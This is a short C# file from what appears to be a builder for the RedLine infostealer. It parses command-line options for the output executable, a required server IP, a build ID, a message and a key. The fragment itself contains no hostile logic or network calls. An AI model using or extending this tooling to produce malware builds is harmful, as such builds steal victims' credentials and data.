using System;

namespace RedlineBuilder;

internal class Arguments
{
	public string output = "build.exe";

	public string ip = string.Empty;

	public string id = string.Empty;

	public string message = string.Empty;

	public string key = string.Empty;

	public bool byParts;

	public Arguments(string[] args)
	{
		for (int i = 0; i < args.Length; i++)
		{
			switch (args[i])
			{
			case "-o":
				output = args[++i];
				break;
			case "-ip":
				ip = args[++i];
				break;
			case "-id":
				id = args[++i];
				break;
			case "-msg":
				message = args[++i];
				break;
			case "-key":
				key = args[++i];
				break;
			case "-by_parts":
				byParts = true;
				break;
			}
		}
		if (string.IsNullOrEmpty(ip))
		{
			throw new Exception("IP Not specified");
		}
		if (string.IsNullOrEmpty(id))
		{
			throw new Exception("ID Not specified");
		}
	}
}
